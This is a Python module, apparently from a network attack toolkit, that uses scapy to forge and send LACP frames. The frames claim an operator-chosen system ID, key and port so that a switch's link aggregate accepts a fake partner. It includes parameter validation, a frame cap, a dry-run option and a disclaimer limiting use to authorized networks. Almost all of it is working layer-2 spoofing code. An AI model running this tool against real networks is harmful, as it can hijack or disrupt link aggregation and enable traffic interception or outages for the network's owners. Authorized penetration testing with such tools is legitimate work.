"""LACP spoofing: send LACPDUs that claim a partner system and key, to form or change a link aggregate.

Link Aggregation Control Protocol (IEEE 802.1AX) bundles several links into one logical link.
Each end sends LACPDUs that describe its own system and ports (the actor). The LACPDUs are not
authenticated, so a device that sends them with a chosen system ID and key can take part in the
negotiation as a partner.

This module sends LACPDUs from the operator's port, each one carrying an actor system ID, key and
port that the operator chooses, with no partner information. The effect to measure is whether the
aggregate on the other end accepts the claimed partner: which partner system ID it reports, and
whether the port joins an aggregator.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import Ether, sendp
from scapy.contrib.lacp import LACP
from scapy.contrib.slowprot import SlowProtocol
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac, random_mac

SLOW_PROTOCOLS_MAC = "01:80:c2:00:00:02"
ETHERTYPE_SLOW = 0x8809
LACP_SUBTYPE = 1
# Actor state: Activity, Timeout (short), Aggregation, Synchronization, Collecting, Distributing.
DEFAULT_STATE = 0x3F
MAX_FRAMES = 1000
MAX_KEY = 0xFFFF
MAX_PRIORITY = 0xFFFF


@dataclass(frozen=True)
class LacpSpoofingConfig:
    iface: str                          # attacker interface, on the link to the aggregate under test
    system_mac: str = ""                # actor system ID claimed; empty = a random MAC for the run
    key: int = 1                        # actor key claimed
    port_number: int = 1                # actor port number claimed
    system_priority: int = 32768        # actor system priority claimed
    port_priority: int = 128            # actor port priority claimed
    state: int = DEFAULT_STATE          # actor state bits
    frames: int = 10                    # LACPDUs to send in total
    interval: float = 1.0               # seconds between LACPDUs (LACP fast rate is 1 s)
    dry_run: bool = False               # build LACPDUs but do not send them

    def __post_init__(self) -> None:
        if self.system_mac:
            normalize_unicast_mac(self.system_mac)
        for name, value, limit in (
            ("Key", self.key, MAX_KEY),
            ("Port number", self.port_number, MAX_KEY),
            ("System priority", self.system_priority, MAX_PRIORITY),
            ("Port priority", self.port_priority, MAX_PRIORITY),
            ("State", self.state, 0xFF),
        ):
            if not 0 <= value <= limit:
                raise ValueError(f"{name} must be between 0 and {limit}.")
        if not 1 <= self.frames <= MAX_FRAMES:
            raise ValueError(f"Frames must be between 1 and {MAX_FRAMES}.")
        if self.interval <= 0:
            raise ValueError("Interval must be positive.")


@dataclass
class LacpSpoofingStats:
    sender_mac: str = ""
    frames: int = 0
    status: str = ""


def build_lacpdu(
    system_mac: str,
    key: int = 1,
    port_number: int = 1,
    system_priority: int = 32768,
    port_priority: int = 128,
    state: int = DEFAULT_STATE,
) -> Packet:
    """LACPDU from `system_mac` with the actor fields set and an empty partner, to the Slow Protocols address."""
    sender = normalize_unicast_mac(system_mac)
    return (
        Ether(src=sender, dst=SLOW_PROTOCOLS_MAC, type=ETHERTYPE_SLOW)
        / SlowProtocol(subtype=LACP_SUBTYPE)
        / LACP(
            actor_system_priority=system_priority,
            actor_system=sender,
            actor_key=key,
            actor_port_priority=port_priority,
            actor_port_number=port_number,
            actor_state=state,
            partner_system="00:00:00:00:00:00",
            partner_key=0,
            partner_port_priority=0,
            partner_port_number=0,
            partner_state=0,
        )
    )


def run_lacp_spoofing(
    config: LacpSpoofingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[LacpSpoofingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> LacpSpoofingStats:
    """Send `frames` LACPDUs, one every `interval` seconds, from the claimed actor."""
    rng = rng or random.Random()
    send = send or sendp
    sender = config.system_mac or random_mac(rng)

    if config.dry_run:
        stats = LacpSpoofingStats(
            sender_mac=sender,
            status=(
                f"Dry run: would send {config.frames} LACPDU(s) claiming system {sender}, key {config.key}, "
                f"port {config.port_number}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    frame = build_lacpdu(sender, config.key, config.port_number, config.system_priority,
                         config.port_priority, config.state)
    stats = LacpSpoofingStats(sender_mac=sender)
    for _ in range(config.frames):
        if stop_event.wait(0) or stop_event.is_set():
            break
        send(frame, iface=config.iface, verbose=False)
        stats.frames += 1
        on_progress(replace(stats))
        if stop_event.wait(config.interval):
            break
    return stats
